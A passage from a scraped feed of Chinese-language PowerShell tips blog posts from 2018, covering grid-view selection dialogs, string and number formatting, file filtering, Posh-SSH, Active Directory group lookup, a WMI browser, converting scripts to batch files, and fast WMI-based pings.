当您将对象用管道输出到网格视图窗口中，所有属性都会显示出来。通常情况下这可以工作得很好，只需要这样一行代码： 1Get-Service | Out-GridView -Title &quot;Select Service&quot; -OutputMode Single 有些时候，特别是一个对象有诸多属性时，可能会让用户看不过来： 12Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Out-GridView -Title &quot;Select Network Card&quot; -OutputMode Single 要简化这个对话框，您可以使用我们之前在用户配置文件管理中的方法，使用一个哈希表。只需要选择一个属性作为键。这个属性必须是唯一的。接下来，试试这段代码： 123456789101112Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Out-GridView -Title &quot;Select Network Card&quot; -OutputMode Single$hashTable = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Group-Object -Property Description -AsHashTable -AsString$hashTable.Keys | Sort-Object | Out-GridView -Title &quot;Select Network Card&quot; -OutputMode Single | ForEach-Object { $hashTable[$_] } 如您所见，只有选择中的属性会在网格视图窗口中显示，当用户选择了一个元素，将获取到完整的对象。这和服务列表的工作方式很像： 123456789$hashTable = Get-Service | Group-Object -Property DisplayName -AsHashTable -AsString$hashTable.Keys | Sort-Object | Out-GridView -Title &quot;Select Service&quot; -OutputMode Single | ForEach-Object { $hashTable[$_] }","link":"/2018/01/17/using-a-grid-view-window-as-a-selection-dialog-part-1/"},{"title":"PowerShell 技能连载 - 用网格视图窗口作为选择对话框（第二部分）","text":"在前一个技能中我们介绍了如何使用哈希表来显示简单的选择对话框，而当用户选择了一个对象时，返回完整的对象。 哈希表基本上可以使用任何数据作为键。在前一个例子中，我们使用字符串作为键。它也可以是其它对象。这可以让您做选择对话框的时候十分灵活。 只需要使用 Select-Object 来选择希望在网格视图窗口中显示的属性，并且用它来作为哈希表的键。 1234567891011121314151617181920212223# create a hash table where the key is the selected properties to display,# and the value is the original object$hashTable = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | # sort the objects by a property of your choice Sort-Object -Property Description | # use an ordered hash table to keep sort order # (requires PowerShell 3; for older PowerShell remove [Ordered]) ForEach-Object { $ht = [Ordered]@{}}{ # specify the properties that you would like to show in a grid view window $key = $_ | Select-Object -Property Description, IPAddress, MacAddress $ht.Add($key, $_) }{$ht} Group-Object -Property Description, Index -AsHashTable -AsString# show the keys in the grid view window$hashTable.Keys | Out-GridView -Title &quot;Select Network Card&quot; -OutputMode Single | ForEach-Object { # and retrieve the original (full) object by using # the selected item as key into your hash table $selectedObject = $hashTable[$_] $selectedObject | Select-Object -Property * } 当您运行这段代码时，网格视图窗口显示一个网络适配器的列表，并且只显示选择的属性 (Description、IPAddress 和 MacAddress)。 当用户选择了一个元素，这段代码返回原始的（完整）对象。这样即便网格视图窗口显示的是对象的一部分，整个对象任然可以用。","link":"/2018/01/18/using-a-grid-view-window-as-a-selection-dialog-part-2/"},{"title":"PowerShell 技能连载 - 快速创建逗号分隔的字符串（第 1 部分）","text":"这是一个非常简单的创建引号包起来的字符串的列表的例子： 1&amp; { &quot;'$($args -join &quot;','&quot;)'&quot; } hello this is a test 以下是执行结果： 1'hello','this','is','a','test' 这个例子有效利用了 PowerShell 的“命令模式”，字面量被当作参数使用。您还可以将结果通过管道导出到 Set-Clipboard 指令执行，然后将结果贴回代码中。这比起手工为每个字符串添加引号方便多了。 1234PS&gt; &amp; { &quot;'$($args -join &quot;','&quot;)'&quot; } hello this is a test | Set-ClipBoardPS&gt; Get-ClipBoard'hello','this','is','a','test'","link":"/2018/01/19/efficiently-produce-comma-separated-strings/"},{"title":"PowerShell 技能连载 - 用网格视图窗口显示列表视图（第 1 部分）","text":"一个最简单的硬件清单功能可以用一行代码实现： 12$data = systeminfo.exe /FO CSV | ConvertFrom-Csv$data | Out-GridView 一个更现代的方法是使用新的 Get-ComputerInfo cmdlet： 12$data = Get-ComputerInfo$data | Out-GridView 一个最简单方法是用 Group-Object 创建一个哈希表：将原始数据用某个属性，例如 UserName` 来分组。然后，在网格视图窗口中显示哈希表的键。当用户选择了一个对象时，将选中的项目作为哈希表的键，找到原始项目： 1234567$data = Get-ComputerInfo$data | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name | ForEach-Object { $hash = @{}} { $hash[$_] = $data.$_ } { $hash } | Out-GridView 现在网格视图窗口以更好的方式显示信息。这段代码用 Get-Member 来查找信息对象 $data 中暴露的属性名。它接下来创建一个哈希表，每个属性代表一个键，每个值代表一个属性值。 本质上，网格视图窗口现在显示的是多个键值对，而不是单一的一个对象。","link":"/2018/01/23/using-list-view-in-a-grid-view-window-part-1/"},{"title":"PowerShell 技能连载 - 快速创建逗号分隔的字符串（第 2 部分）","text":"在前一个技能中我们演示了如何用 PowerShell 命令模式方便地创建引号包围的字符串列表。这可以很方便地创建代码，节省很多打字工作。 以下是一个在日常 PowerShell 编码工作中有用的函数： 1function s+ { &quot;'$($args -join &quot;','&quot;)'&quot; | Set-ClipBoard } 下一次您在代码中需要一个引号包围的字符串列表时，只需要键入： 12345678910PS&gt; s+ start stop pause end whateverPS&gt; 'start','stop','pause','end','whatever'startstoppauseendwhateverPS&gt; 执行完之后，引号包围的字符串就会存在您的剪贴板中，接下来您可以将它们粘贴到任何需要的地方。","link":"/2018/01/22/efficiently-produce-comma-separated-strings-part-2/"},{"title":"PowerShell 技能连载 - 用网格视图窗口显示列表视图（第 2 部分）","text":"Out-GridView 是一个有用的 cmdlet。但如果只是用它来显示一个单一对象的所有属性时不太理想，因为这样显示出来只有一行。在前一个技能中我们解释了将一个对象转换为一个哈希表能解决这个问题。它实际上是将一个网格视图工作在“列表视图”模式。 因为这个方法在许多场景中十分有用，以下是一个封装好的名为 ConvertObject-ToHashTable 的函数，以及一系列示例代码： 1234567891011121314151617181920212223242526function ConvertObject-ToHashTable{ param ( [Parameter(Mandatory,ValueFromPipeline)] $object ) process { $object | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name | Sort-Object | ForEach-Object { [PSCustomObject]@{ Item = $_ Value = $object.$_} } }}systeminfo.exe /FO CSV | ConvertFrom-Csv | ConvertObject-ToHashTable | Out-GridViewGet-ComputerInfo | ConvertObject-ToHashTable | Out-GridViewGet-WmiObject -Class Win32_BIOS | ConvertObject-ToHashTable | Out-GridView","link":"/2018/01/24/using-list-view-in-a-grid-view-window-part-2/"},{"title":"PowerShell 技能连载 - 用网格视图窗口显示列表视图（第 3 部分）","text":"在前一个技能中我们介绍了 ConvertObject-ToHashTable 函数，它能方便地将对象显示在一个网格视图窗口中。 以下代码是一个改进的版本，能够根据字母顺序排列属性，并且可以由您决定每一列的名称。缺省情况下，Out-GridView 的列名为 “Property” 和 “Value”，但您将它们改为任意名称： 12345678910111213141516171819202122232425262728293031323334353637function ConvertObject-ToHashTable{ param ( [Parameter(Mandatory,ValueFromPipeline)] $object, [string] $PropertyName = &quot;Property&quot;, [string] $ValueName = &quot;Value&quot; ) process { $object | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name | Sort-Object | ForEach-Object { [PSCustomObject]@{ $PropertyName = $_ $ValueName = $object.$_} } }}Get-ComputerInfo | # by default, columns are named &quot;Property&quot; and &quot;Value&quot; ConvertObject-ToHashTable | Out-GridViewGet-WmiObject -Class Win32_BIOS | # specify how you'd like to call the columns displayed in a grid view window ConvertObject-ToHashTable -PropertyName Information -ValueName Data | Out-GridView","link":"/2018/01/25/using-list-view-in-a-grid-view-window-part-3/"},{"title":"PowerShell 技能连载 - 过滤文件","text":"您可能还没有注意到，Get-ChildItem（也叫做 dir 或者 ls） 的 -Filter 参数并不是像您所想的方式工作。以下代码的本意是只查找 PowerShell 脚本，但实际上找到的结果更多： 12Get-ChildItem -Path $env:windir -Filter *.ps1 -Recurse -ErrorAction Silent | Group-Object -Property Extension -NoElement 以下是查找结果： 1234Count Name----- ---- 800 .ps1 372 .ps1xml -Filter 参数的作用和传统的 dir 命令的行为类似。要真正起到您想要的效果，您应该使用以下代码： 12Get-ChildItem -Path $env:windir -Filter *.ps1 -Include *.ps1 -Recurse -ErrorAction SilentlyContinue | Group-Object -Property Extension -NoElement 以下是正确的结果： 123Count Name----- ---- 800 .ps1 虽然您可以省略 -Filter 参数，但强烈建议保留着它。首先，-Include 只能和 -Recurse 配合使用其次，-Include 速度很慢。先用一个粗略（但是快速）的 -Filter 过滤，然后用 Include 是最佳实践。","link":"/2018/01/26/filtering-files/"},{"title":"PowerShell 技能连载 - 格式化数字（第 1 部分）","text":"以下 Get-DisplayFileSize 函数接受任何字节数值，并且返回一个以 “MB”、”GB” 或 “PB” 为单位的，格式良好的大小值。 12345678910111213141516171819function Get-DisplayFileSize{ param([Double]$Number) $newNumber = $Number $unit = ',KB,MB,GB,TB,PB,EB,ZB' -split ',' $i = $null while ($newNumber -ge 1KB -and $i -lt $unit.Length) { $newNumber /= 1KB $i++ } if ($i -eq $null) { return $number } $displayText = &quot;'{0:N2} {1}'&quot; -f $newNumber, $unit[$i] $Number = $Number | Add-Member -MemberType ScriptMethod -Name ToString -Value ([Scriptblock]::Create($displayText)) -Force -PassThru return $Number} 以下是一些例子： 12345678PS&gt; Get-DisplayFileSize -Number 800800PS&gt; Get-DisplayFileSize -Number 678678674345632,07 GBPS&gt; Get-DisplayFileSize -Number 6.23GB6,23 GB 真正有趣的地方是这个函数返回的并不是字符串。它返回的是原始的数值，而只是覆盖了 ToString() 方法。您仍然可以对它进行排序、计算和对比： 12345678910111213PS&gt; $n = 1245646233213PS&gt; $formatted = Get-DisplayFileSize -Number $nPS&gt; $formatted1,13 TBPS&gt; $formatted -eq $nTruePS&gt; $formatted * 22491292466426PS&gt; Get-DisplayFileSize ($formatted * 2)2,27 TB","link":"/2018/01/29/formatting-numbers-part-1/"},{"title":"PowerShell 技能连载 - 格式化数字（第 2 部分）","text":"在前一个技能中我们介绍了 Get-DisplayFileSize 函数，它可以自动将字节数转换成容易阅读的带单位的数字，例如 “KB” 和 “MB”。 使用 Select-Object 指令，您可以创建一个带有易读的文件尺寸的文件夹列表： 1234567891011121314151617181920212223242526$Length = @{ Name = &quot;Length&quot; Expression = { if ($_.PSIsContainer) { return } $Number = $_.Length $newNumber = $Number $unit = 'Bytes,KB,MB,GB,TB,PB,EB,ZB' -split ',' $i = 0 while ($newNumber -ge 1KB -and $i -lt $unit.Length) { $newNumber /= 1KB $i++ } if ($i -eq $null) { $decimals = 0 } else { $decimals = 2 } $displayText = &quot;'{0,10:N$decimals} {1}'&quot; -f $newNumber, $unit[$i] $Number = $Number | Add-Member -MemberType ScriptMethod -Name ToString -Value ([Scriptblock]::Create($displayText)) -Force -PassThru return $Number }}# pretty file sizesdir $env:windir | Select-Object -Property Mode, LastWriteTime, $Length, Name | Sort-Object -Property Length 请注意计算属性 Length 仍然可以用于排序。它仍是字节数据，只是显示的方式改变了。","link":"/2018/01/30/formatting-numbers-part-2/"},{"title":"PowerShell 技能连载 - 通过 PowerShell 管理 FTP","text":"在 PowerShell 中没有内置 FTP 命令，但是您可以方便地下载和安装一个免费的扩展，该扩展提供了您想要的 FTP 管理功能。只需要运行这行代码： 1PS&gt; Install-Module -Name Posh-SSH -Scope CurrentUser 如果 PowerShell 无法找到 Install-Module 命令，那么您很有可能没有运行最新版本的 PowerShell (5.1)。请升级您的 PowerShell，或者添加 Microsoft 的 “PowerShellGet” 模块，该模块提供了 Install-Module 命令。 该命令会会从公共的 PowerShell Gallery 下载 Posh-SSH 模块。当您同意下载内容之后，便新增了以下指令： 1234567891011121314151617181920212223242526272829303132333435363738394041424344PS&gt; Get-Command -Module Posh-SSHCommandType Name Version Source----------- ---- ------- ------Function Get-PoshSSHModVersion 2.0.2 Posh-SSHFunction Get-SFTPChildItem 2.0.2 Posh-SSHFunction Get-SFTPContent 2.0.2 Posh-SSHFunction Get-SFTPLocation 2.0.2 Posh-SSHFunction Get-SFTPPathAttribute 2.0.2 Posh-SSHFunction Get-SFTPSession 2.0.2 Posh-SSHFunction Get-SSHPortForward 2.0.2 Posh-SSHFunction Get-SSHSession 2.0.2 Posh-SSHFunction Get-SSHTrustedHost 2.0.2 Posh-SSHFunction Invoke-SSHCommand 2.0.2 Posh-SSHFunction Invoke-SSHCommandStream 2.0.2 Posh-SSHFunction Invoke-SSHStreamExpectAction 2.0.2 Posh-SSHFunction Invoke-SSHStreamExpectSecureAction 2.0.2 Posh-SSHFunction New-SFTPFileStream 2.0.2 Posh-SSHFunction New-SFTPItem 2.0.2 Posh-SSHFunction New-SFTPSymlink 2.0.2 Posh-SSHFunction New-SSHDynamicPortForward 2.0.2 Posh-SSHFunction New-SSHLocalPortForward 2.0.2 Posh-SSHFunction New-SSHRemotePortForward 2.0.2 Posh-SSHFunction New-SSHShellStream 2.0.2 Posh-SSHFunction New-SSHTrustedHost 2.0.2 Posh-SSHFunction Remove-SFTPItem 2.0.2 Posh-SSHFunction Remove-SFTPSession 2.0.2 Posh-SSHFunction Remove-SSHSession 2.0.2 Posh-SSHFunction Remove-SSHTrustedHost 2.0.2 Posh-SSHFunction Rename-SFTPFile 2.0.2 Posh-SSHFunction Set-SFTPContent 2.0.2 Posh-SSHFunction Set-SFTPLocation 2.0.2 Posh-SSHFunction Set-SFTPPathAttribute 2.0.2 Posh-SSHFunction Start-SSHPortForward 2.0.2 Posh-SSHFunction Stop-SSHPortForward 2.0.2 Posh-SSHFunction Test-SFTPPath 2.0.2 Posh-SSHCmdlet Get-SCPFile 2.0.2 Posh-SSHCmdlet Get-SCPFolder 2.0.2 Posh-SSHCmdlet Get-SFTPFile 2.0.2 Posh-SSHCmdlet New-SFTPSession 2.0.2 Posh-SSHCmdlet New-SSHSession 2.0.2 Posh-SSHCmdlet Set-SCPFile 2.0.2 Posh-SSHCmdlet Set-SCPFolder 2.0.2 Posh-SSHCmdlet Set-SFTPFile 2.0.2 Posh-SSH 在 powershellmagazine.com 有一篇延伸的文章介绍如何使用这些命令：","link":"/2018/01/31/managing-ftp-via-powershell/"},{"title":"PowerShell 技能连载 - 从 Windows 10 中移除臃肿的软件","text":"Windows 10 附带了各种预装的应用程序和其它特性，这些内容可能是某些人反感。Richard Newton 创建了一个 PowerShell 脚本，用来识别和移除许多预装的特性，并且加强了隐私设置。他在 https://github.com/Sycnex/Windows10Debloater 描述了他的项目。 源码可以在这里找到：https://github.com/Sycnex/Windows10Debloater/blob/master/Windows10Debloater.ps1。 我们向您推荐这个脚本因为它包含了许多有用的技术，演示了在 Windows 10 中如何移除应用和注册表键。当然，不建议在不了解的情况下运行这个脚本。请确保您了解将会移除什么内容，以及您是否真的希望移除它。","link":"/2018/02/01/removing-bloatware-from-windows-10/"},{"title":"PowerShell 技能连载 - 检查网络连接","text":"如果您的机器通过不同网络连接，连到了 internet（或 VPN），以下两个函数可能对您有用。 Get-ActiveConnection 列出当前所有获取到 IP 地址的网络连接。Test-ActiveConnection 接受一个关键字并检查是否有一个名字中包含该关键字的活动连接。 1234567891011121314151617function Get-ActiveConnection{ Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress } | Select-Object -ExpandProperty Description}function Test-ActiveConnection{ param([Parameter(Mandatory)]$Keyword) @(Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress } | Where-Object { $_.Description -like &quot;*$Keyword*&quot; }).Count -gt 0} 以下是一个快速的演示输出： 12345678910PS&gt; Get-ActiveConnectionDell Wireless 1820A 802.11acPS&gt; Test-ActiveConnection dellTruePS&gt; if ( (Test-ActiveConnection dell) ) { Write-Warning &quot;Connected via DELL network card&quot; }WARNING: Connected via DELL network cardPS&gt;","link":"/2018/02/02/checking-network-connections/"},{"title":"PowerShell 技能连载 - 查找嵌套的 AD 组成员","text":"以下代码查找某个 Active Directory 用户属于哪些组（包括嵌套的组成员）。该代码需要 ActiveDirectory 模块。 12345678910111213141516171819#requires -Module ActiveDirectoryfunction Get-NestedGroupMember{ param ( [Parameter(Mandatory,ValueFromPipeline)] [string] $Identity ) process { $user = Get-ADUser -Identity $Identity $userdn = $user.DistinguishedName $strFilter = &quot;(member:1.2.840.113556.1.4.1941:=$userdn)&quot; Get-ADGroup -LDAPFilter $strFilter -ResultPageSize 1000 }} 要查找组成员，只需要执行 Get-NestedGroupMember，跟上用户名即可。该函数和 Get-ADUser 接受同样的身份信息，所以您可以传入 SamAccountName、SID、GUID，或 distinguishedName。","link":"/2018/02/05/finding-nested-ad-group-memberships/"},{"title":"PowerShell 技能连载 - 简易的 WMI 浏览器","text":"WMI 是一个丰富的信息库——如果您知道 WMI 的类名： 123Get-CimInstance -ClassName Win32_BIOSGet-CimInstance -ClassName Win32_ShareGet-CimInstance -ClassName Win32_OperatingSystem 如果您想探索 WMI 的内容，那么以下代码会十分便利。Find-WmiClass 接受一个简单的关键字，例如 “video”、”network”、”ipaddress”。接下来它可以获取所有类名、某个属性名或方法名包含该关键字的 WMI 类。 12345678910111213141516171819202122232425262728293031function Find-WmiClass{ param([Parameter(Mandatory)]$Keyword) Write-Progress -Activity &quot;Finding WMI Classes&quot; -Status &quot;Searching&quot; # find all WMI classes... Get-WmiObject -Class * -List | # that contain the search keyword Where-Object { # is there a property or method with the keyword? $containsMember = ((@($_.Properties.Name) -like &quot;*$Keyword*&quot;).Count -gt 0) -or ((@($_.Methods.Name) -like &quot;*$Keyword*&quot;).Count -gt 0) # is the keyword in the class name, and is it an interesting type of class? $containsClassName = $_.Name -like &quot;*$Keyword*&quot; -and $_.Properties.Count -gt 2 -and $_.Name -notlike 'Win32_Perf*' $containsMember -or $containsClassName } Write-Progress -Activity &quot;Find WMI Classes&quot; -Completed}$classes = Find-WmiClass$classes | # let the user select one of the found classes Out-GridView -Title &quot;Select WMI Class&quot; -OutputMode Single | ForEach-Object { # get all instances of the selected class Get-CimInstance -Class $_.Name | # show all properties Select-Object -Property * | Out-GridView -Title &quot;Instances&quot; } 接下来用户可以选择某个找到的类，该代码将显示这个类的实际实例。 声明：有部分类有几千个实例，例如 CIM_File。当选择了一个有这么多实例的 WMI 类时，该脚本将执行很长时间才能完成。","link":"/2018/02/06/simple-wmi-browser/"},{"title":"PowerShell 技能连载 - 用管道传递文件和文件夹","text":"假设您想创建一个函数，接受一个文件路径参数。文件可以进行许多操作。您可能希望拷贝文件，压缩文件，将它们设置为隐藏文件，或其它各种操作。我们在这里并不关注具体需要做什么操作。我们希望关注 PowerShell 函数如何接受文件参数。 您应该遇到过这样的函数： 12345678910111213function Process-File{ param ( $Path ) # do something with the file $file = Get-Item -Path $Path 'File {0} is of size {1} bytes.' -f $file.FullName, $file.Length}Process-File -Path C:\\windows\\explorer.exe 结果看起来类似这样： 12345PS&gt; Process-File -Path C:\\windows\\explorer.exeFile C:\\windows\\explorer.exe is of size 3903784 bytes.PS&gt; 这个函数每次只处理一个路径。如果希望传入多个路径，您需要这样做： 1234567891011121314151617function Process-File{ param ( [string[]] $Path ) foreach($SinglePath in $Path) { # do something with the file $file = Get-Item -Path $SinglePath 'File {0} is of size {1} bytes.' -f $file.FullName, $file.Length }}Process-File -Path C:\\windows\\explorer.exe, C:\\windows\\notepad.exe 现在，您的函数可以接受任意多个逗号分隔的路径。如果您希望也能从管道输入路径呢？需要增加这些代码： 12345678910111213141516171819202122function Process-File{ param ( [Parameter(ValueFromPipeline)] [string[]] $Path ) process { foreach($SinglePath in $Path) { # do something with the file $file = Get-Item -Path $SinglePath 'File {0} is of size {1} bytes.' -f $file.FullName, $file.Length } }}Process-File -Path C:\\windows\\explorer.exe, C:\\windows\\notepad.exe'C:\\windows\\explorer.exe', 'C:\\windows\\notepad.exe' | Process-File 基本上，您现在有两个嵌套的循环：process {} 是管道对象使用的循环，而其中的 foreach 循环处理用户传入的的字符串数组。 如果您希望 Get-ChildItem 提供路径给函数呢？它并不是返回字符串。它返回的是文件系统对象，而且在对象之内，有一个名为 “FullName” 的属性，存储对象的路径。以下是您要做的： 123456789101112131415161718192021222324function Process-File{ param ( [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)] [string[]] [Alias(&quot;FullName&quot;)] $Path ) process { foreach($SinglePath in $Path) { # do something with the file $file = Get-Item -Path $SinglePath 'File {0} is of size {1} bytes.' -f $file.FullName, $file.Length } }}Process-File -Path C:\\windows\\explorer.exe, C:\\windows\\notepad.exe'C:\\windows\\explorer.exe', 'C:\\windows\\notepad.exe' | Process-FileGet-ChildItem -Path c:\\windows -Filter *.exe | Process-File 现在，这个函数不止能接受管道传来的字符串 (ValueFromPipeline)，而且还能接受有某个属性名或别名与参数 (Path) 相似的对象 (ValueFromPipelineByPropertyName)。任务完成了。您的函数现在能够为用户提供最大的灵活性，这基本上也是 cmdlet 所做的事。","link":"/2018/02/07/piping-files-and-folders/"},{"title":"PowerShell 技能连载 - 将 PowerShell 脚本转换为批处理","text":"以下是一个有趣的 PowerShell 脚本，名为 Convert-PowerShellToBatch。将 PowerShell 脚本的路径作为参数传给它，或者将 Get-ChildItem 的执行结果用管道传给它，来批量执行多个脚本。 该函数为每个脚本创建一个批处理文件。当您双击批处理文件时，将执行 PowerShell 代码。 1234567891011121314151617181920function Convert-PowerShellToBatch{ param ( [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] [string] [Alias(&quot;FullName&quot;)] $Path ) process { $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content -Path $Path -Raw -Encoding UTF8))) $newPath = [Io.Path]::ChangeExtension($Path, &quot;.bat&quot;) &quot;@echo off`npowershell.exe -NoExit -encodedCommand $encoded&quot; | Set-Content -Path $newPath -Encoding Ascii }}Get-ChildItem -Path C:\\path\\to\\powershell\\scripts -Filter *.ps1 | Convert-PowerShellToBatch 当您查看某个生成的脚本文件时，您会发现 PowerShell 代码被转换为 BASE64 编码的字符串。所以这种转换适用于许多真实世界的需求： 双击执行一个批处理文件来运行 PowerShell 代码更方便。 没有经验的用户更不容易受诱惑去改动脚本，因为它经过 BASE64 编码。 申明：BASE64 并不是加密。将 BASE64 编码的文本转换为可读的明文是很简单的事。所以这里用的技术不适合用来隐藏秘密，例如密码。","link":"/2018/02/08/converting-powershell-to-batch/"},{"title":"PowerShell 技能连载 - 创建随机的密码","text":"以下是另一小段用于生成由指定数量的大小写字母、数字，和特殊字符组成的随机密码： 12345678910111213141516$length = 10$length_small = $length - 3$numbers = '2,3,4,5,6,7,8,9' -split ','$large = 'A,B,C,D,E,F,G,H,K,L,M,N,P,R,S,T,U,V,W,X,Y,Z' -split ','$small = 'A,B,C,D,E,F,G,H,K,L,M,N,P,R,S,T,U,V,W,X,Y,Z'.ToLower() -split ','$special = '!,§,$,='.Split(',')$password = @()$password = @($numbers | Get-Random)$password += @($large | Get-Random)$password += @($small | Get-Random -Count $length_small)$password += @($special | Get-Random)$password = $password | Get-Random -Count $length$password -join ''","link":"/2018/02/09/creating-randompasswords/"},{"title":"PowerShell 技能连载 - 读取 RunOnce 注册表键","text":"Windows 注册表中的 RunOnce 键存储了所有的自启动。它可能是空的。要检查自启动的应用程序请试试这段代码： 123$path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'$properties = Get-ItemProperty -Path $path$properties 再次申明，这个键可能没有内容。如果它有内容，那么每个自启动程序都有它自己的值和名字。如果只要读取自启动程序的路径，请用 GetValueNames() 读取这个注册表键。它能够读取注册表值的名称。然后通过 GetValue() 读取实际的值： 123$path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'$key = Get-Item -Path $path$key.GetValueNames() | ForEach-Object { $key.GetValue($_) }","link":"/2018/02/12/reading-runonce-key/"},{"title":"PowerShell 技能连载 - 探索 Select-Object","text":"Select-Object 是一个基础的 cmdlet，多数 PowerShell 用户都经常使用它。然而，它有一些限制，不太为大家所知。 Select-Object 最常见的形式是选择可见的属性。如果不使用 Select-Object，那么 PowerShell 将自行决定该显示哪些属性，以及它们的格式： 1Get-ChildItem -Path c:\\windows\\system32 -Filter *.dll 如果加上了 Select-Object，您可以自行决定哪些属性可见。例如： 12Get-ChildItem -Path c:\\windows\\system32 -Filter *.dll | Select-Object -Property CreationTime, Length, Name, VersionInfo Select-Object 还可以将属性的内容向上提升一层。在前一个例子中，VersionInfo 包含另一个对象。通过使用 -ExpandProperty 属性，您可以将它的属性向上提升一层： 12Get-ChildItem -Path c:\\windows\\system32 -Filter *.dll | Select-Object -Property CreationTime, Length, Name -ExpandProperty VersionInfo 要查看合并属性的实际结果，请将结果再次发送给 Select-Object，因为 PowerShell 默认情况下只显示其中的一部分结果： 123Get-ChildItem -Path c:\\windows\\system32 -Filter *.dll | Select-Object -Property CreationTime, Length, Name -ExpandProperty VersionInfo | Select-Object -Property * 除了 “*” 之外，您还可以用逗号分隔的列表来决定要查看的属性： 123Get-ChildItem -Path c:\\windows\\system32 -Filter *.dll | Select-Object -Property CreationTime, Length, Name -ExpandProperty VersionInfo | Select-Object -Property CreationTime, Name, FileVersionRaw, CompanyName","link":"/2018/02/13/exploiting-select-object/"},{"title":"PowerShell 技能连载 - 获取 PowerShell 的帮助","text":"假设您下载了 PowerShell 的帮助文件，有一个获取各类 PowerShell 主题的快捷方法： 首先，确保您下载了帮助文件：以管理员权限启动 PowerShell，并且运行以下代码： 1Update-Help -UICulture en-us -Force 下一步，检查 “about” 主题： 1Get-Help about_* 在 PowerShell ISE 中，您所需要做的是点击 cmdlet 列出的主题，然后按 F1 键。这将产生一个类似这样的命令： 1PS&gt; Get-Help -Name 'about_If' -ShowWindow 在其它编辑器里，例如 VSCode 的 PowerShell 控制台，您需要自己键入命令。它将在 PowerShell 帮助查看器中打开帮助主题。 您也可以搜索指定的帮助主题，例如： 1234567891011PS&gt; help operatorName Category Module Synopsis---- -------- ------ --------about_Arithmetic_Operators HelpFile Describes the operators that perform…about_Assignment_Operators HelpFile Describes how to use operators to…about_Comparison_Operators HelpFile Describes the operators that compare…about_Logical_Operators HelpFile Describes the operators that connect…about_Operators HelpFile Describes the operators that are…about_Operator_Precedence HelpFile Lists the Windows PowerShell operators…about_Type_Operators HelpFile Describes the operators that work with… 在 PowerShell ISE 中，仍然可以点击某个列出的 about 主题，并按 F1 查看它的内容。 技术上，所有 about 主题都是文本文件，它们的位置在这里： 1PS&gt; explorer $pshome\\en-us","link":"/2018/02/14/getting-help-for-powershell/"},{"title":"PowerShell 技能连载 - 创建快速的 Ping（第一部分）","text":"Ping 是一个常见的任务。类似 Test-Connection 等 PowerShell cmdlet 可以进行 Ping 操作，但没有超时限制，所以当您尝试 ping 一台离线的主机时，可能要比较长时间才能得到结果。 WMI 支持带超时的 ping 操作。以下是使用方法： 1234$ComputerName = 'microsoft.com'$TimeoutMillisec = 1000Get-WmiObject -Class Win32_PingStatus -Filter &quot;Address='$ComputerName' and timeout=$TimeoutMillisec&quot; | Select-Object -Property Address, StatusCode 状态码 0 代表成功，其它代码代表失败。","link":"/2018/02/15/creating-high-speed-ping-part-1/"},{"title":"PowerShell 技能连载 - 创建快速的 Ping（第二部分）","text":"在前一个技能中我们演示了如何用 WMI 以指定的超时值 ping 计算机。WMI 还可以做更多的事：它可以迅速 ping 多台计算机，不过语法有一点另类。 以下是如何 ping 多台计算机： 1234# ping the specified servers with a given timeout (milliseconds)$TimeoutMillisec = 1000Get-WmiObject -Class Win32_PingStatus -Filter &quot;(Address='microsoft.com' or Address='r13-c14' or Address='google.com') and timeout=$TimeoutMillisec&quot; | Select-Object -Property Address, StatusCode","link":"/2018/02/16/creating-highspeed-ping-part-2/"},{"title":"PowerShell 技能连载 - 创建快速的 Ping（第三部分）","text":"在前一个技能中我们演示了如何用 WMI 快速 ping 多台计算机，它的语法比较另类。那么让我们重写代码，使得指定要 ping 的计算机列表变得更容易： 12345678# ping the specified servers with a given timeout (milliseconds)$ComputerName = 'google.de','microsoft.com','r13-c00'$TimeoutMillisec = 1000# convert list of computers into a WMI query string$query = $ComputerName -join &quot;' or Address='&quot;Get-WmiObject -Class Win32_PingStatus -Filter &quot;(Address='$query') and timeout=$TimeoutMillisec&quot; | Select-Object -Property Address, StatusCode 现在要 ping 更大量的计算机变得更容易：只要将它们加入 $ComputerName 字符串数组。假如有一个文本文件，每行是一个计算机名，您也可以用 Get-Content 来写入 $ComputerName 变量。","link":"/2018/02/19/creating-highspeed-ping-part-3/"},{"title":"PowerShell 技能连载 - 创建快速的 Ping（第四部分）","text":"在前一个技能中我们演示了如何用 WMI 快速 ping 多台计算机。那么今天我们将它封装为一个可复用的 PowerShell 函数。它可以快速地 ping 一台或多台计算机。 以下是函数代码： 12345678910111213141516function Test-OnlineFast{ param ( [Parameter(Mandatory)] [string[]] $ComputerName, $TimeoutMillisec = 1000 ) # convert list of computers into a WMI query string $query = $ComputerName -join &quot;' or Address='&quot; Get-WmiObject -Class Win32_PingStatus -Filter &quot;(Address='$query') and timeout=$TimeoutMillisec&quot; | Select-Object -Property Address, StatusCode} 现在要以指定的超时值 ping 多台计算机变得非常简单： 123456PS&gt; Test-OnlineFast -ComputerName microsoft.com, google.deAddress StatusCode------- ----------google.de 0microsoft.com 11010 状态码 “0” 代表响应结果：主机在线。其他状态码代表失败。 默认情况下，Test-OnlineFast 的超时时间为 1000 毫秒，所以当一台计算机没有响应时，最多等待 1 秒。您可以通过 -TimeoutMillseconds 参数改变超时值。设置越长的超时值意味着命令的执行时间越长。所以您应该在系统足够响应的范围内使用尽可能短的超时时间。 另一个影响时间的变量是 DNS 解析：如果 DNS 解析速度慢，或者无法解析到名称，将增加总体时间。如果指定 IP 地址，就不会发生这种变慢现象。 以下是在几秒内 ping 200 个 IP 地址的例子： 123456789101112PS&gt; $ComputerName = 1..255 | ForEach-Object { &quot;10.62.13.$_&quot; }PS&gt; Test-OnlineFast -ComputerName $ComputerNameAddress StatusCode------- ----------10.62.13.1 1101010.62.13.10 010.62.13.100 010.62.13.101 1101010.62.13.102 